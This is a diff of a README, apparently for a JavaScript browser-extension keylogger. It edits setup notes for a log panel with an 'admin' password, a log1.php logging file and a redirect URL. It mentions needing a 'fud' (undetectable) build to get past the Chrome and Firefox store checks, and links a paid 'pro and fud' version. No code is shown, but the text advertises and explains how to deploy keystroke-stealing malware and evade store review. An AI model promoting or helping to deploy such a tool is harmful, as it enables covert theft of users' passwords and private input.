@@ -13,7 +13,7 @@ best keylogger javascript
 
 ![WhatsApp Image 2020-04-29 at 18 16 32](https://user-images.githubusercontent.com/30985149/81166239-ec3a8500-8f82-11ea-951f-32392a168dbc.jpeg)
 
-open log without redirect , remove log very simple (new panel )
+open log without redirect , remove log very simple 
 
 ![file2](https://user-images.githubusercontent.com/30985149/92989185-3b14a000-f4ca-11ea-8637-368880ff07ac.JPG)
 
@@ -29,6 +29,7 @@ password = admin
 
 2. `log1.php` 
 
+Line 13
 
 If you want : SET YOUR DATETIMEZONE HERE :
 
@@ -64,7 +65,7 @@ change "url" redirect after install extension
  to upload extension in mozilla firefox or chrome web store you need a new version fud 
 or some technique .
 
-version pro and fud can found here https://shoppy.gg/product/5d9ifM3
+version pro and fud can found here with assistant https://shoppy.gg/product/5d9ifM3 
 
 # Contact 
 
